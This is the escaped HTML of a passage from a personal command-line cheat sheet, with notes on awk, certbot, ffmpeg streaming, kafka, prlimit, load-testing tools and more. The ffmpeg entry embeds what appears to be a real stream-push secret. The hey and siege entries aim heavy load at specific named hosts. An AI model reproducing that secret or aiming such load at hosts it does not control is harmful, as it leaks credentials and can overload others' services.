style=\"display:flex;\"\u003e\u003cspan\u003euuidgen|awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print tolower($0)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: 649612b0-0fa4-4b50-9b13-17279f602a43\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# To uppercase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;hello world\u0026#39;\u003c/span\u003e|awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print toupper($0)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: HELLO WORLD\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 提取子字符串: `substr(string, start, length)`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello world\u0026#34;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print substr($0, 1, 5)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: hello\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 全局替換字符串中的正則表達式匹配項: `gsub(regex, replacement, string)`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 替換字符串中首次匹配的正則表達式: `sub(regex, replacement, string)`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello world\u0026#34;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{gsub(/world/, \u0026#34;everyone\u0026#34;); print $0}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: hello everyone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 將數字轉換為整數\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3.14\u0026#34;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print int($0)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: 3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 返回平方根\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;99\u0026#34;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print sqrt($0)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: 9.94987\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 指數和對數\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print exp($0), log($0)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: 7.38906 0.693147\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecaffeinate\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 防止显示器关闭\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecaffeinate -d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 保持系统不休眠\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecaffeinate -i\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 保持 30 分钟\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecaffeinate -t \u003cspan style=\"color:#ae81ff\"\u003e1800\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecertbot\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Install\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt install certbot python3-certbot-nginx python3-certbot-dns-route53\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 1. Generating Wildcard Certificates\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo certbot certonly --manual --preferred-challenges\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003edns --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d *.example.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e### add txt record then press enter to continue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 2. Generating Wildcard Certificates\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo certbot certonly -d example.com -d *.example.com --dns-route53 --agree-tos --server https://acme-v02.api.letsencrypt.org/directory\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Automating Renewal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e * * \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e /usr/bin/certbot certonly --dns-route53 -d *.example.com --quiet --post-hook \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;systemctl reload nginx\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecutycapt\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Capture website page as picture\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003exvfb-run --server-args\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-screen 0, 1024x768x24\u0026#34;\u003c/span\u003e cutycapt --url\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ehttps://www.google.com --out\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/google.png\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edmesg\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo dmesg -T | grep -i \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;killed process\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# total-vm: 該程序分配的虛擬記憶體總量（含未實際使用）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# anon-rss: 匿名頁面 resident memory（實際佔用記憶體）→ 重點\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# file-rss: 映射檔案的 resident memory（如 shared libraries）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# shmem-rss: 共用記憶體的 resident memory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ednscontrol\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/common/files/creds.json\"\u003ecreds.json\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003ecommand\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ednscontrol get-zones --format\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ejs --out\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eexample.com.js r53 ROUTE53 example.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ednscontrol get-zones --format\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ejs --out\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eexample.com.js cloudflare CLOUDFLAREAPI example.com\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003effmpeg\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Download sample video\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewget https://www.sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4 -O test.mp4\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Push stream\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effmpeg -re -i test.mp4 -c copy -f flv \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rtmp://209357.push.tlivecloud.com/live/big_buck_bunny_720p_1mb?txSecret=a543b79d9a8c38ace5ce18eea2bd7721\u0026amp;txTime=687E4609\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ego\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego tool pprof -http\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e:8081 20250814_024534.heap\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ek6\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/common/files/k6.js\"\u003ek6.js\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003ecommand\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ek6 run k6.js\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ekafka\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list topics\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekafka-topics.sh --bootstrap-server 127.0.0.1:9094 --list\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# all topics count\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekafka-topics.sh --bootstrap-server 127.0.0.1:9094 --list |wc -l\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ehey\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehey -n \u003cspan style=\"color:#ae81ff\"\u003e200000\u003c/span\u003e -c \u003cspan style=\"color:#ae81ff\"\u003e500\u003c/span\u003e -h2 -z 30s https://a8-wss.hddv1.com/test\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eopenfortivpn\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# https://github.com/adrienverge/openfortivpn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo openfortivpn ip:port --username\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ericky --pppd-use-peerdns\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eopenssl\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 自簽名證書，要把 ca.p7b 匯入 certmgr.msc 的受信任的根憑證授權單位，Chrome 才吃的到。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl crl2pkcs7 -nocrl -certfile ca.crt -out ca.p7b\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eprlimit\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 更改 Max_open_files 遇到參數錯誤，原因為 CentOS6 與 CentOS7 指令不同\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# CentOS6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i in \u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eps -ef | grep \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;publish/server/game_server\u0026#39;\u003c/span\u003e | egrep -v \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;grep|startall\u0026#39;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e echo -n \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Max open files=1024000:1024000\u0026#34;\u003c/span\u003e \u0026gt; /proc/$i/limits; \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# CentOS7\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i in \u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eps -ef | grep gateway | grep -v grep | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e prlimit --pid $i --nofile\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e1024000:1024000 ; \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003esiege\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esiege --time\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e3s --concurrent\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e30000\u003c/span\u003e https://a8-h5.hddv1.com/index.html\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003etr\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# cat krypton2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eYRIRY GJB CNFFJBEQ EBGGRA\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# cat krypton2 | tr a-zA-Z n-za-mN-ZA-M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLEVEL TWO PASSWORD ROTTEN\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evegeta\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/usr/bin/env bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan 